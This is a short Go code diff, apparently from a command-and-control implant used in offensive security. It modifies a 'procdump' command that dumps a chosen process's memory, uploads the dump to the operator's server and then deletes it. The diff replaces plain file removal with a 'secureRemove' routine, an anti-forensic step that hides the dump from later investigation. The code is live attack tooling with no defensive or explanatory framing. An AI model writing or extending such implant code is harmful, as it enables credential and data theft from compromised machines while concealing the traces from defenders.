@@ -134,14 +134,14 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	dumpFile.Close()
 
 	if ret == 0 {
-		os.Remove(dumpPath)
+		secureRemove(dumpPath)
 		return errorf("memory dump failed for PID %d (%s): %v", targetPID, processName, callErr)
 	}
 
 	// Get dump file info
 	fi, err := os.Stat(dumpPath)
 	if err != nil {
-		os.Remove(dumpPath)
+		secureRemove(dumpPath)
 		return errorf("Failed to stat dump file: %v", err)
 	}
 
@@ -150,7 +150,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	// Open the dump file for transfer
 	file, err := os.Open(dumpPath)
 	if err != nil {
-		os.Remove(dumpPath)
+		secureRemove(dumpPath)
 		return errorf("Failed to open dump file for transfer: %v", err)
 	}
 
@@ -171,7 +171,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		select {
 		case <-downloadMsg.FinishedTransfer:
 			file.Close()
-			os.Remove(dumpPath)
+			secureRemove(dumpPath)
 			return structs.CommandResult{
 				Output:    fmt.Sprintf("Successfully dumped %s (PID %d)\nDump size: %s\nFile uploaded to server and cleaned from disk.", processName, targetPID, formatFileSize(dumpSize)),
 				Status:    "success",
@@ -180,7 +180,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
 				file.Close()
-				os.Remove(dumpPath)
+				secureRemove(dumpPath)
 				return errorResult("Dump upload cancelled")
 			}
 		}
